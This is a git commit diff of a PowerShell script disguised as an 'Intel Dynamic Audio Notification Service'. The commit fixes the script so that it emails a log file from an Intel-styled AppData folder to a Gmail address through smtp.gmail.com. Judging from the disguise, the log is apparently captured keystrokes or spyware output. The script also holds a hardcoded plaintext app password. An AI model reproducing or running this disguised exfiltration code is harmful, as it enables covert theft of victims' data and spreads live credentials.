99e7290c56e6f08bafc589628a3e5f94edd0b742
B95segal <193628847+B95segal@users.noreply.github.com>
2025-01-18 20:07:11 +1100

    debug

--- Intel Dynamic Audio Notification Service.ps1
+++ Intel Dynamic Audio Notification Service.ps1
@@ -1,8 +1,10 @@
-﻿﻿$From = "gf90ali@gmail.com"
+﻿$From = "gf90ali@gmail.com"
 $To = "gf90ali@gmail.com"
-$Attachment = "%USERPROFILE%\AppData\Roaming\Intel Corporation\Intel Dynamic Audio Platform Service\Intel Dynamic Audio Platform Service.log"
 $Subject = "Intel Dynamic Notification Report"
 $Body = "Please see attached. Thank you."
-$Password = "wlipppkosvrsqonz" | ConvertToString -AsPlainText -Force
+$Attachment = "$env:APPDATA\Intel Corporation\Intel Dynamic Audio Platform Service\Intel Dynamic Audio Platform Service.log"
+
+# The password is an app-specific password if you have 2-factor-auth enabled
+$Password = "wlipppkosvrsqonz" | ConvertTo-SecureString -AsPlainText -Force
 $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password
-Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -Attachments $Attachment -SmtpServer "smtp.gmail.com" -port 587 -UseSsl -Credential $Credential
+Send-MailMessage -SmtpServer smtp.gmail.com -Port 587 -UseSsl -To $To -From $From -Subject $Subject -Body $Body -Attachments $Attachment -Credential $Credential
